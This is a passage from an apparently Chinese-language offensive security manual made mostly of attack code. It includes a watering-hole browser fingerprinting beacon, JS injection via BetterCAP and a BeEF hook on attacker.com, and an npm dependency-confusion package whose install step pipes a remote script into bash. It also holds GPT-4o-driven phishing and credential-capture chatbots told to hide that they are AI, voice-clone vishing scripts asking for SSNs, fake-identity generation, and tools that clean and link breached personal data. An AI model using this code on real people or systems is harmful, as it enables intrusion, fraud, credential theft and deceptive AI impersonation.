            if (!gl) return 'unknown';
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debugInfo) return 'unknown';
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            };
        } catch(e) { return 'error'; }
    },

    getPlugins: function() {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push({
                name: navigator.plugins[i].name,
                filename: navigator.plugins[i].filename,
                description: navigator.plugins[i].description
            });
        }
        return plugins;
    },

    getCanvasFingerprint: function() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Browser Fingerprint Test 2026', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Browser Fingerprint Test 2026', 4, 17);
            return canvas.toDataURL();
        } catch(e) { return 'error'; }
    },

    getWebGLFingerprint: function() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (!gl) return 'unknown';
            const result = {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                extensions: gl.getSupportedExtensions()
            };
            return result;
        } catch(e) { return 'error'; }
    },

    getAudioFingerprint: function() {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const analyser = audioCtx.createAnalyser();
            const gain = audioCtx.createGain();
            const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);

            oscillator.type = 'triangle';
            oscillator.connect(analyser);
            analyser.connect(gain);
            gain.connect(audioCtx.destination);
            gain.gain.value = 0; // 静音
            oscillator.start(0);

            const freqData = new Float32Array(analyser.frequencyBinCount);
            analyser.getFloatFrequencyData(freqData);
            oscillator.stop(0);
            audioCtx.close();

            return Array.from(freqData.slice(0, 30)).join(',');
        } catch(e) { return 'error'; }
    },

    // 信标发送
    beacon: function(data) {
        const img = new Image();
        img.src = this.config.collectorUrl + '/beacon?' +
            'd=' + encodeURIComponent(btoa(JSON.stringify(data))) +
            '&t=' + Date.now();
    },

    // 初始化
    init: function() {
        const fp = this.collectFingerprint();
        this.beacon({type: 'fingerprint', data: fp});

        // 定期心跳
        setInterval(() => {
            this.beacon({
                type: 'heartbeat',
                url: window.location.href,
                timestamp: Date.now()
            });
        }, this.config.beaconInterval);
    }
};

// 启动水坑攻击
WateringHole.init();
```

**JS 注入部署方法**：

```bash
# 1. 通过中间人攻击注入（需要网络位置）
# 使用 BetterCAP 进行 HTTP 流量注入
bettercap -eval "
  set http.proxy.sslstrip true;
  set http.proxy.inject.bettercap true;
  http.proxy on;
  net.probe on;
  net.sniff on;
"

# 2. 通过供应链攻击注入（修改第三方JS库）
# 在 CDN 或 npm 包中注入恶意代码

# 3. 利用 XSS 漏洞持久化注入
# 在目标网站评论/用户资料中注入持久化 XSS

# 4. 浏览器扩展注入
# 发布恶意浏览器扩展（Chrome Web Store / Firefox Add-ons）
```

### 4.2 浏览器 0day 利用

```bash
# 水坑攻击中的浏览器漏洞利用框架
# 使用 BeEF (Browser Exploitation Framework)
cd /opt/beef
./beef

# 配置 BeEF hook
# 在目标网站注入:
# <script src="https://attacker.com:3000/hook.js"></script>

# BeEF 模块示例
# 通过 REST API 控制被 hook 的浏览器
curl -X POST http://localhost:3000/api/modules/1/1 \
  -H "Content-Type: application/json" \
  -d '{"cmd":"get_internal_ip"}'
```

### 4.3 供应链污染与 CDN 投毒

```bash
# npm 包依赖混淆攻击
# 创建与内部包同名的公共包
npm init -y
# 修改 package.json 添加恶意 install 脚本
cat > package.json << 'EOF'
{
  "name": "internal-utils",
  "version": "99.0.0",
  "scripts": {
    "install": "curl -s https://collector.example.com/payload.sh | bash",
    "preinstall": "node -e 'require(\"https\").get(\"https://collector.example.com/beacon?pkg=internal-utils\")'"
  }
}
EOF

# CDN 投毒
# 场景：利用过期的 CDN 域名接管
# 1. 发现目标网站使用的失效 CDN 域名
# 2. 注册该 CDN 域名
# 3. 托管恶意 JS 文件
# 4. 目标网站加载 CDN 资源时执行恶意代码
```

---

## 5. 信息收集 (Information Gathering)

### 5.1 OSINT 开源情报收集

**全自动 OSINT 收集框架**：

```bash
#!/bin/bash
# OSINT 全自动收集脚本
TARGET="$1"
OUTDIR="osint-${TARGET}-$(date +%Y%m%d)"
mkdir -p "$OUTDIR"

# 1. 域名信息收集
echo "[*] Collecting domain information..."
whois "$TARGET" > "$OUTDIR/whois.txt"
dig ANY "$TARGET" > "$OUTDIR/dns-any.txt"
dig TXT "$TARGET" > "$OUTDIR/dns-txt.txt"
dig MX "$TARGET" > "$OUTDIR/dns-mx.txt"
dig NS "$TARGET" > "$OUTDIR/dns-ns.txt"

# 2. 子域名枚举
echo "[*] Enumerating subdomains..."
subfinder -d "$TARGET" -o "$OUTDIR/subdomains.txt"
assetfinder --subs-only "$TARGET" | tee -a "$OUTDIR/subdomains.txt"
amass enum -passive -d "$TARGET" -o "$OUTDIR/amass-subdomains.txt"

# 3. 证书透明度日志
echo "[*] Querying Certificate Transparency logs..."
curl -s "https://crt.sh/?q=%25.${TARGET}&output=json" | \
  jq -r '.[].name_value' | sort -u > "$OUTDIR/crtsh-domains.txt"

# 4. 社交媒体搜索
echo "[*] Searching social media..."
theHarvester -d "$TARGET" -b google,linkedin,github,shodan,twitter \
  -f "$OUTDIR/harvester-results.html"

# 5. 邮箱收集
echo "[*] Collecting email addresses..."
curl -s "https://hunter.io/api/v2/domain-search?domain=${TARGET}&api_key=${HUNTER_API_KEY}" \
  > "$OUTDIR/hunter-emails.json"

# 6. 技术栈指纹
echo "[*] Fingerprinting technology stack..."
whatweb "https://$TARGET" > "$OUTDIR/whatweb.txt"
wappalyzer "https://$TARGET" -o "$OUTDIR/wappalyzer.json"

# 7. GitHub 信息泄露
echo "[*] Searching GitHub..."
github-search -t "$TARGET" -o "$OUTDIR/github-leaks.txt"
# 使用 gitrob 或 truffleHog
trufflehog github --org="$TARGET" --json > "$OUTDIR/trufflehog.json"

# 8. Shodan 搜索
echo "[*] Querying Shodan..."
shodan search "org:'$TARGET'" --fields ip_str,port,org,hostnames > "$OUTDIR/shodan.txt"

# 9. Wayback Machine
echo "[*] Fetching from Wayback Machine..."
waybackurls "$TARGET" | sort -u > "$OUTDIR/waybackurls.txt"
gau "$TARGET" --o "$OUTDIR/gau-urls.txt"

# 10. 泄露数据库查询
echo "[*] Searching breach databases..."
# 需要合法授权访问
curl -s "https://leak-lookup.com/api/v2/search?domain=${TARGET}&key=${LEAK_API_KEY}" \
  > "$OUTDIR/breach-data.json"

echo "[+] OSINT collection complete. Results in $OUTDIR/"
```

### 5.2 社交媒体挖掘

**LinkedIn 信息挖掘**：

```python
#!/usr/bin/env python3
"""
LinkedIn OSINT 挖掘工具
收集目标组织的员工信息、组织架构、技术栈
"""
import requests
import json
import re

class LinkedInOSINT:
    """LinkedIn 公开信息收集"""

    def __init__(self, api_key: str = None):
        self.api_key = api_key
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def search_company_employees(self, company_name: str, keywords: list = None) -> list:
        """搜索公司员工"""
        results = []

        target_keywords = keywords or [
            "security", "IT", "admin", "developer", "engineer",
            "manager", "director", "support", "helpdesk", "network"
        ]

        for keyword in target_keywords:
            # Google dork for LinkedIn
            query = f'site:linkedin.com/in/ "{company_name}" "{keyword}"'
            # 使用 Google Custom Search API
            pass

        return results

    def analyze_org_structure(self, employees: list) -> dict:
        """分析组织架构"""
        org = {
            "departments": {},
            "key_personnel": [],
            "tech_stack": [],
            "email_format": None
        }

        for emp in employees:
            dept = emp.get('department', 'Unknown')
            if dept not in org['departments']:
                org['departments'][dept] = []
            org['departments'][dept].append(emp)

        return org

    def infer_email_format(self, company_domain: str, employees: list) -> str:
        """推断企业邮箱格式"""
        formats = [
            "{first}.{last}@{domain}",
            "{first[0]}{last}@{domain}",
            "{first}@{domain}",
            "{first}_{last}@{domain}",
            "{first}{last[0]}@{domain}",
            "{first[0]}.{last}@{domain}",
            "{last}{first[0]}@{domain}"
        ]
        return formats
```

### 5.3 泄露数据库查询

```bash
# Have I Been Pwned API 查询
curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/user@target.com" \
  -H "hibp-api-key: $HIBP_API_KEY" \
  -H "user-agent: OSINT-Tool" | jq '.'

# DeHashed API 查询
curl -s "https://api.dehashed.com/search?query=domain:target.com" \
  -H "Authorization: Basic $(echo -n $DEHASHED_EMAIL:$DEHASHED_API_KEY | base64)" \
  | jq '.entries[] | {email, password, database_name}'

# IntelX 情报搜索
curl -X POST "https://2.intelx.io/intelligent/search" \
  -H "x-key: $INTELX_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"term":"target.com","maxresults":100,"media":0,"terminate":[]}'
```

### 5.4 Whois 反查与关联分析

```bash
# Whois 反查 - 通过注册人信息查找关联域名
# 使用 WhoisXML API
curl "https://reverse-whois.whoisxmlapi.com/api/v2?apiKey=${WHOISXML_KEY}&searchType=current&mode=purchase&basicSearchTerms={include:[],exclude:[]}&advancedSearchTerms=[{field:'RegistrantContact.Organization',term:'Target Corp'}]"

# DNS 历史记录
curl "https://api.securitytrails.com/v1/history/${TARGET}/dns/a" \
  -H "APIKEY: $SECURITYTRAILS_API_KEY" | jq '.records[] | {value: .values[].ip, first_seen, last_seen}'

# 关联域名发现
curl "https://api.securitytrails.com/v1/domain/${TARGET}/associated" \
  -H "APIKEY: $SECURITYTRAILS_API_KEY" | jq '.records[] | {domain: .hostname, type: .type}'
```

---

## 6. 2026 AI 社工 (AI-Powered Social Engineering)

### 6.1 AI 生成钓鱼邮件

**LLM 驱动的多阶段钓鱼攻击**：

```python
#!/usr/bin/env python3
"""
2026 AI 驱动多阶段钓鱼攻击框架
使用 LLM 进行自适应对话式钓鱼
"""
import openai
import json
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from datetime import datetime

@dataclass
class PhishingSession:
    """钓鱼会话状态管理"""
    target_id: str
    target_profile: Dict
    scenario: str
    stage: int = 0
    conversation_history: List[Dict] = field(default_factory=list)
    collected_info: Dict = field(default_factory=dict)
    engagement_metrics: Dict = field(default_factory=dict)

class AIPhishingEngine:
    """AI 驱动的自适应钓鱼引擎"""

    SCENARIOS = {
        "password_reset": {
            "pretext": "IT Security notification about password policy update",
            "urgency": "medium",
            "stages": ["notification", "reminder", "urgency_upgrade", "manager_impersonation"]
        },
        "ceo_fraud": {
            "pretext": "CEO requesting urgent wire transfer",
            "urgency": "high",
            "stages": ["initial_request", "follow_up", "pressure", "alternative_contact"]
        },
        "hr_update": {
            "pretext": "HR department requesting personal information update",
            "urgency": "medium",
            "stages": ["announcement", "deadline_reminder", "final_notice"]
        },
        "invoice_scam": {
            "pretext": "Vendor requesting payment details update",
            "urgency": "high",
            "stages": ["invoice_notification", "payment_reminder", "escalation_to_manager"]
        },
        "tech_support": {
            "pretext": "IT support about detected malware on device",
            "urgency": "high",
            "stages": ["alert", "verification", "remote_access"]
        }
    }

    def __init__(self, openai_api_key: str):
        self.client = openai.OpenAI(api_key=openai_api_key)
        self.active_sessions: Dict[str, PhishingSession] = {}

    def generate_email(self, session: PhishingSession) -> Dict:
        """使用 LLM 生成个性化钓鱼邮件"""
        scenario = self.SCENARIOS.get(session.scenario, {})

        system_prompt = """You are a red team professional conducting authorized security testing.
Generate realistic phishing emails based on the target profile and scenario.
All content is for authorized testing only. Maintain professional tone."""

        user_prompt = f"""
Generate a phishing email for the following scenario:

Target Profile:
- Name: {session.target_profile.get('name')}
- Position: {session.target_profile.get('position')}
- Department: {session.target_profile.get('department')}
- Company: {session.target_profile.get('company')}
- Known Interests: {session.target_profile.get('interests', [])}
- Recent Activity: {session.target_profile.get('recent_activity', [])}

Scenario: {session.scenario}
Stage: {scenario.get('stages', ['initial'])[session.stage]}
Urgency Level: {scenario.get('urgency', 'medium')}

Previously collected info: {json.dumps(session.collected_info)}

Generate:
1. Subject line
2. Email body (HTML formatted)
3. Call-to-action
4. Psychological technique used (authority/urgency/scarcity/social proof/liking/reciprocity)

IMPORTANT: This is for authorized red team testing. Mark headers appropriately.
"""

        response = self.client.chat.completions.create(
            model="gpt-4o",
            messages=[
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_prompt}
            ],
            temperature=0.7,
            max_tokens=1500
        )

        content = response.choices[0].message.content
        session.conversation_history.append({
            "role": "assistant",
            "content": content,
            "stage": session.stage,
            "timestamp": datetime.now().isoformat()
        })

        return {
            "session_id": session.target_id,
            "stage": session.stage,
            "content": content,
            "scenario": session.scenario
        }

    def adapt_response(self, session: PhishingSession, target_response: str) -> Dict:
        """根据目标回复自适应调整策略"""
        system_prompt = """You are a red team phishing AI. Analyze the target's response
and determine the next step. The goal is to elicit the desired action while
maintaining realistic conversation. Be adaptive and persuasive."""

        user_prompt = f"""
Target Profile: {json.dumps(session.target_profile)}
Current Scenario: {session.scenario}
Stage: {session.stage}
Conversation History: {json.dumps(session.conversation_history[-5:])}
Target's Response: {target_response}

Analyze the response and determine:
1. Sentiment: positive/neutral/skeptical/hostile
2. Engagement level: high/medium/low
3. Best next action: continue_conversation/escalate/change_tactic/abort
4. Next message to send
5. If information was disclosed, extract it

Respond in JSON format.
"""

        response = self.client.chat.completions.create(
            model="gpt-4o",
            messages=[
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_prompt}
            ],
            temperature=0.5,
            response_format={"type": "json_object"}
        )

        analysis = json.loads(response.choices[0].message.content)

        if analysis.get("extracted_info"):
            session.collected_info.update(analysis["extracted_info"])

        session.conversation_history.append({
            "role": "user",
            "content": target_response,
            "analysis": analysis,
            "timestamp": datetime.now().isoformat()
        })

        return analysis

    def run_campaign(self, targets: List[Dict], scenario: str) -> Dict:
        """批量运行钓鱼活动"""
        results = {"total": len(targets), "sessions": [], "metrics": {}}

        for target in targets:
            session = PhishingSession(
                target_id=target.get('email'),
                target_profile=target,
                scenario=scenario
            )
            self.active_sessions[target.get('email')] = session

            email = self.generate_email(session)
            results['sessions'].append({
                "target": target.get('name'),
                "email": target.get('email'),
                "initial_email": email,
                "session_id": target.get('email')
            })

        return results


# 使用示例
# engine = AIPhishingEngine(OPENAI_API_KEY)
# targets = [
#     {"name": "Alice Wang", "email": "alice.wang@target.com",
#      "position": "Finance Manager", "department": "Finance",
#      "company": "Target Corp", "interests": ["ERP systems", "compliance"]}
# ]
# results = engine.run_campaign(targets, "ceo_fraud")
```

### 6.2 DeepFake 语音克隆

**2026 语音克隆攻击链**：

```bash
# 语音克隆工作流
# 1. 收集目标语音样本（公开演讲、采访、社交媒体视频）
# 2. 使用 AI 语音克隆工具

# 使用 OpenVoice (2026年顶级语音克隆)
git clone https://github.com/myshell-ai/OpenVoice.git
cd OpenVoice

# 安装
pip install -r requirements.txt

# 下载预训练模型（V2 支持情感和口音控制）
python -c "
from openvoice import OpenVoice
model = OpenVoice()
model.download_models()
"

# 语音克隆脚本
python3 << 'PYEOF'
import torch
from openvoice import OpenVoice

class VoiceCloningAttack:
    """DeepFake 语音克隆攻击框架"""

    def __init__(self):
        self.model = OpenVoice()
        self.model.load_models()

    def clone_voice(self, source_audio: str, target_text: str,
                    emotion: str = "neutral", accent: str = "en-us") -> str:
        """克隆语音并生成指定文本"""
        # 提取源语音的音色特征
        tone_color = self.model.extract_tone_color(source_audio)

        # 生成克隆语音
        output = self.model.generate(
            text=target_text,
            tone_color=tone_color,
            emotion=emotion,  # neutral, happy, angry, sad, surprised
            accent=accent,    # en-us, en-uk, zh-cn, ja, ko
            speed=1.0
        )

        # 保存生成的语音
        output_path = f"cloned_voice_{hasattr(target_text, '__hash__')}.wav"
        self.model.save_audio(output, output_path)
        return output_path

    def create_vishing_script(self, target_profile: dict, scenario: str) -> str:
        """生成 Vishing 脚本"""
        scripts = {
            "ceo_approval": """
            Hi {name}, this is {ceo_name}. I'm in a meeting right now and can't talk long.
            I need you to approve an urgent wire transfer for {amount} to {vendor}.
            I'll send you the details by email. Can you confirm you'll process this right away?
            """,
            "it_support": """
            Hello {name}, this is {it_name} from IT Security. We've detected unusual
            login activity on your account from {location}. I need to verify your
            identity to prevent account lockout. Can you confirm your employee ID?
            """,
            "hr_confidential": """
            Hi {name}, it's {hr_name} from HR. I'm calling about a confidential matter
            regarding your {topic}. Before I can share details, I need to verify
            a few things. What's your date of birth and last 4 of SSN?
            """
        }

        base = scripts.get(scenario, scripts["it_support"])
        return base.format(
            name=target_profile.get('name', 'employee'),
            ceo_name=target_profile.get('ceo_name', 'the CEO'),
            it_name=target_profile.get('it_name', 'IT Support'),
            hr_name=target_profile.get('hr_name', 'HR Director'),
            amount=target_profile.get('amount', '$50,000'),
            vendor=target_profile.get('vendor', 'a vendor'),
            location=target_profile.get('location', 'Beijing'),
            topic=target_profile.get('topic', 'upcoming performance review')
        )

# 使用
# cloner = VoiceCloningAttack()
# script = cloner.create_vishing_script(
#     {"name": "Zhang Wei", "ceo_name": "Li Ming"},
#     "ceo_approval"
# )
# cloned_audio = cloner.clone_voice("ceo_public_speech.wav", script, "urgent")
PYEOF
```

**DeepFake 检测对抗**：

```bash
# 语音克隆后处理 - 增加真实感
# 1. 添加背景噪音
sox cloned_voice.wav noisy_voice.wav synth whitenoise vol 0.02

# 2. 模拟电话音质
ffmpeg -i cloned_voice.wav -acodec pcm_mulaw -ar 8000 -ac 1 phone_quality.wav

# 3. 添加环境回音
sox cloned_voice.wav echo_voice.wav reverb 50 50 100 0.5

# 4. 模拟不同通话场景
# 办公室场景
sox cloned_voice.wav office_voice.wav \
  synth whitenoise vol 0.01 \
  highpass 200 lowpass 3400
```

### 6.3 LLM 驱动的对话式钓鱼

**自动化对话式钓鱼聊天机器人**：

```python
#!/usr/bin/env python3
"""
LLM 驱动的对话式钓鱼聊天机器人
支持 Telegram/SMS/Email/WhatsApp 多平台
"""
import openai
import asyncio
from typing import AsyncGenerator
from dataclasses import dataclass
import json

@dataclass
class ChatPhishingConfig:
    """聊天钓鱼配置"""
    platform: str  # telegram, sms, whatsapp, email
    target_profile: dict
    scenario: str
    max_turns: int = 20
    goal: str = "credential_capture"  # credential_capture, malware_delivery, info_gathering

class ChatPhishingBot:
    """对话式钓鱼机器人"""

    SYSTEM_PROMPTS = {
        "credential_capture": """You are conducting an authorized red team security test.
Your goal is to convince the target to provide their login credentials
through natural conversation. Build rapport first, then guide the
conversation toward the goal. Be patient and adaptive.

Target context: {context}
Scenario: {scenario}

Rules:
1. Never reveal you are an AI or part of a test
2. Maintain professional tone appropriate to the scenario
3. If challenged, have a plausible explanation
4. Build trust through relevant details about the target's organization
5. Do not threaten or use aggressive tactics
""",
        "malware_delivery": """You are conducting an authorized red team security test.
Your goal is to convince the target to download and open a file
through natural conversation. The file is a benign test payload.

Target context: {context}
Scenario: {scenario}

Rules:
1. Never reveal you are an AI or part of a test
2. The file must be presented as a legitimate business document
3. Create urgency but not panic
4. Have technical explanations ready if questioned
""",
        "info_gathering": """You are conducting an authorized red team security test.
Your goal is to extract sensitive information about the target's
organization through natural conversation.

Target context: {context}
Scenario: {scenario}

Rules:
1. Never reveal you are an AI or part of a test
2. Ask questions that seem natural in the conversation context
3. Build rapport before asking sensitive questions
4. Use social proof and reciprocity
"""
    }

    def __init__(self, api_key: str):
        self.client = openai.AsyncOpenAI(api_key=api_key)

    async def chat(self, config: ChatPhishingConfig) -> AsyncGenerator[str, None]:
        """运行对话式钓鱼会话"""
        system_prompt = self.SYSTEM_PROMPTS[config.goal].format(
            context=json.dumps(config.target_profile, ensure_ascii=False),
            scenario=config.scenario
        )

        messages = [{"role": "system", "content": system_prompt}]

        # 生成开场消息
        response = await self.client.chat.completions.create(
            model="gpt-4o",
            messages=messages + [{"role": "user",
                "content": "Start the conversation. Send the first message."}],
            temperature=0.8
        )

        opener = response.choices[0].message.content
        messages.append({"role": "assistant", "content": opener})
        yield opener

        # 对话循环
        turn = 0
        while turn < config.max_turns:
            # 用户回复（在实际部署中，这会从消息平台接收）
            user_response = yield "__AWAITING_INPUT__"

            if user_response is None:
                break

            messages.append({"role": "user", "content": user_response})

            response = await self.client.chat.completions.create(
                model="gpt-4o",
                messages=messages,
                temperature=0.7
            )

            bot_message = response.choices[0].message.content
            messages.append({"role": "assistant", "content": bot_message})
            yield bot_message
            turn += 1

    async def analyze_conversation(self, messages: list) -> dict:
        """分析对话效果"""
        analysis_prompt = """Analyze this phishing conversation and provide metrics:
1. Trust level achieved (1-10)
2. Rapport building effectiveness (1-10)
3. Goal achievement (0-100%)
4. Target's susceptibility score (1-10)
5. Key psychological triggers used
6. Recommendations for improvement

Conversation:
{conversation}

Respond in JSON format."""

        response = await self.client.chat.completions.create(
            model="gpt-4o",
            messages=[{"role": "user",
                "content": analysis_prompt.format(
                    conversation=json.dumps(messages, ensure_ascii=False))}],
            response_format={"type": "json_object"}
        )

        return json.loads(response.choices[0].message.content)
```

### 6.4 AI 虚假身份生成

**AI 生成虚假数字身份**：

```python
#!/usr/bin/env python3
"""
AI 生成的数字身份创建框架
用于授权红队演练中的伪装身份
"""
import openai
import json
from datetime import datetime, timedelta
import random

class FakeIdentityGenerator:
    """AI 虚假身份生成器"""

    def __init__(self, api_key: str):
        self.client = openai.OpenAI(api_key=api_key)

    def generate_identity(self, role: str, organization: str) -> dict:
        """生成完整的虚假身份"""
        prompt = f"""Generate a realistic fake professional identity for a red team exercise.
Role: {role}
Organization: {organization}

Create a complete identity including:
1. Full name (realistic for the role and region)
2. Professional background (education, previous jobs)
3. Social media persona (LinkedIn, Twitter, GitHub)
4. Professional interests and expertise
5. Communication style and vocabulary
6. Plausible reason for contacting targets
7. Knowledge of organization-specific terminology

All details must be internally consistent and verifiable through basic research.
Respond in JSON format."""

        response = self.client.chat.completions.create(
            model="gpt-4o",
            messages=[{"role": "user", "content": prompt}],
            response_format={"type": "json_object"}
        )

        identity = json.loads(response.choices[0].message.content)
        identity["metadata"] = {
            "generated_at": datetime.now().isoformat(),
            "role": role,
            "organization": organization,
            "backstop_verified": False
        }

        return identity

    def create_linkedin_profile(self, identity: dict) -> dict:
        """生成 LinkedIn 个人资料结构"""
        return {
            "name": identity["full_name"],
            "headline": f"{identity.get('title', 'Professional')} at {identity.get('organization', 'Company')}",
            "about": identity.get("professional_background", ""),
            "experience": identity.get("work_history", []),
            "education": identity.get("education", []),
            "skills": identity.get("skills", []),
            "certifications": identity.get("certifications", []),
            "activity": self._generate_realistic_activity()
        }

    def _generate_realistic_activity(self) -> list:
        """生成真实的社交媒体活动记录"""
        activities = [
            {"type": "like", "content": "Interesting article about cloud security trends", "days_ago": random.randint(1, 30)},
            {"type": "share", "content": "AI in cybersecurity webinar announcement", "days_ago": random.randint(1, 15)},
            {"type": "comment", "content": "Great insights on zero-trust architecture", "days_ago": random.randint(1, 7)},
            {"type": "post", "content": "Excited to attend RSA Conference 2026", "days_ago": random.randint(30, 90)},
            {"type": "connection", "content": "Connected with industry professionals", "days_ago": random.randint(1, 14)}
        ]
        return activities

    def create_email_account(self, identity: dict, domain: str) -> dict:
        """创建配套的邮箱账户信息"""
        name = identity["full_name"].lower().replace(" ", ".")
        return {
            "email": f"{name}@{domain}",
            "display_name": identity["full_name"],
            "signature": f"""
{identity.get('full_name', '')}
{identity.get('title', '')} | {identity.get('organization', '')}
Email: {name}@{domain}
Phone: {identity.get('phone', 'N/A')}
""",
            "auto_reply": identity.get("auto_reply", "Thank you for your email. I will respond as soon as possible.")
        }
```

---

## 7. 社工库技术 (Social Engineering Database Technology)

社工库是社会工程学攻击的核心基础设施，涉及数据收集、清洗、关联分析和知识图谱构建。

### 7.1 数据清洗与标准化

**社工库数据清洗框架**：

```python
#!/usr/bin/env python3
"""
社工库数据清洗与标准化工具
处理多源泄露数据，统一格式，去重，质量评估
"""
import re
import json
import hashlib
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime

@dataclass
class PersonalRecord:
    """个人信息记录"""
    email: str = ""
    username: str = ""
    password: str = ""
    password_hash: str = ""
    hash_type: str = ""
    full_name: str = ""
    phone: str = ""
    id_number: str = ""
    address: str = ""
    ip_address: str = ""
    source: str = ""
    breach_date: str = ""
    data_quality: float = 0.0
    record_id: str = ""

class DataCleaner:
    """社工库数据清洗器"""

    EMAIL_REGEX = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
    PHONE_REGEX_CN = re.compile(r'^1[3-9]\d{9}$')
    ID_REGEX_CN = re.compile(r'^\d{17}[\dXx]$')

    @staticmethod
    def clean_email(email: str) -> Optional[str]:
        """清洗邮箱地址"""
        email = email.strip().lower()
        match = DataCleaner.EMAIL_REGEX.match(email)
        if match:
            return email
        # 尝试修复常见乱码
        email = email.replace('(at)', '@').replace('(dot)', '.')
        email = email.replace(' ', '')
        match = DataCleaner.EMAIL_REGEX.match(email)
        return email if match else None

    @staticmethod
    def clean_phone(phone: str) -> Optional[str]:
        """清洗手机号"""
        phone = re.sub(r'[\s\-\(\)\+]', '', phone)
        if phone.startswith('+86'):
            phone = phone[3:]
        if phone.startswith('86'):
            phone = phone[2:]
        match = DataCleaner.PHONE_REGEX_CN.match(phone)
        return phone if match else None

    @staticmethod
    def analyze_password(password: str) -> Dict[str, Any]:
        """分析密码强度"""
        result = {
            "original": password,
            "length": len(password),
            "has_upper": bool(re.search(r'[A-Z]', password)),
            "has_lower": bool(re.search(r'[a-z]', password)),
            "has_digit": bool(re.search(r'\d', password)),
            "has_special": bool(re.search(r'[^A-Za-z0-9]', password)),
            "entropy": 0.0,
            "common_pattern": False
        }
        # 检测常见密码模式
        common_patterns = [
            r'^123456', r'^password', r'^qwerty', r'^admin',
            r'^abc123', r'^(.)\1+$', r'^[a-z]+$', r'^\d+$'
        ]
        for pattern in common_patterns:
            if re.match(pattern, password.lower()):
                result["common_pattern"] = True
                break
        # 计算香农熵
        import math
        char_counts = {}
        for c in password:
            char_counts[c] = char_counts.get(c, 0) + 1
        entropy = 0
        for count in char_counts.values():
            p = count / len(password)
            entropy -= p * math.log2(p)
        result["entropy"] = round(entropy, 2)
        return result

    def process_breach_file(self, filepath: str, source: str) -> List[PersonalRecord]:
        """处理泄露文件"""
        records = []
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                try:
                    parts = line.strip().split(':')
                    if len(parts) < 2:
                        continue
                    email = self.clean_email(parts[0])
                    password = parts[1] if len(parts) > 1 else ""
                    if email:
                        record = PersonalRecord(
                            email=email,
                            password=password,
                            source=source,
                            record_id=hashlib.md5(f"{email}:{password}:{source}".encode()).hexdigest()
                        )
                        records.append(record)
                except Exception:
                    continue
        return records

    def deduplicate(self, records: List[PersonalRecord]) -> List[PersonalRecord]:
        """去重，保留最高质量的记录"""
        seen = {}
        for record in records:
            key = record.email
            if key not in seen or record.data_quality > seen[key].data_quality:
                seen[key] = record
        return list(seen.values())

# cleaner = DataCleaner()
# records = cleaner.process_breach_file("leak_data.txt", "breach_source_2026")
# cleaned = cleaner.deduplicate(records)
```

### 7.2 关联分析

**跨源数据关联分析引擎**：

```python
#!/usr/bin/env python3
"""
多源数据关联分析引擎
通过邮箱、手机号、用户名等关联不同泄露源的数据
"""
import networkx as nx
from collections import defaultdict

class CorrelationEngine:
    """多源数据关联分析引擎"""

    def __init__(self):
        self.graph = nx.Graph()
        self.email_index = defaultdict(set)
        self.phone_index = defaultdict(set)
        self.username_index = defaultdict(set)
        self.ip_index = defaultdict(set)

    def add_record(self, record: dict):
        """添加一条记录并建立索引"""
        record_id = record.get('id', hash(str(record)))
        if record.get('email'):
            self.email_index[record['email']].add(record_id)
            self.graph.add_node(record_id, type='record', **record)
            self.graph.add_edge(record_id, f"email:{record['email']}", type='email')
        if record.get('phone'):
            self.phone_index[record['phone']].add(record_id)
            self.graph.add_edge(record_id, f"phone:{record['phone']}", type='phone')
        if record.get('username'):
            self.username_index[record['username']].add(record_id)
            self.graph.add_edge(record_id, f"username:{record['username']}", type='username')
        if record.get('ip_address'):
            self.ip_index[record['ip_address']].add(record_id)
            self.graph.add_edge(record_id, f"ip:{record['ip_address']}", type='ip')

    def find_related_records(self, identifier: str, id_type: str = 'email') -> list:
        """查找与给定标识符关联的所有记录"""
        index_map = {
            'email': self.email_index,
            'phone': self.phone_index,
            'username': self.username_index,
            'ip': self.ip_index
        }
        if identifier not in index_map.get(id_type, {}):
            return []
        related_ids = set()
        visited = set()
        queue = list(index_map[id_type][identifier])
        while queue:
            record_id = queue.pop(0)
            if record_id in visited:
                continue
            visited.add(record_id)
            related_ids.add(record_id)
            for neighbor in self.graph.neighbors(record_id):
                if neighbor.startswith('email:'):
                    for rid in self.email_index.get(neighbor.replace('email:', ''), []):
                        if rid not in visited:
                            queue.append(rid)
                elif neighbor.startswith('phone:'):
                    for rid in self.phone_index.get(neighbor.replace('phone:', ''), []):
                        if rid not in visited:
                            queue.append(rid)
        return [self.graph.nodes[rid] for rid in related_ids if rid in self.graph.nodes]

    def build_persona(self, identifier: str) -> dict:
        """构建个人画像"""
        records = self.find_related_records(identifier)
        persona = {
            "emails": set(),
            "phones": set(),
            "usernames": set(),
            "passwords": set(),
            "ips": set(),
            "sources": set(),
            "password_patterns": []
        }
        for record in records:
            if record.get('email'): persona['emails'].add(record['email'])
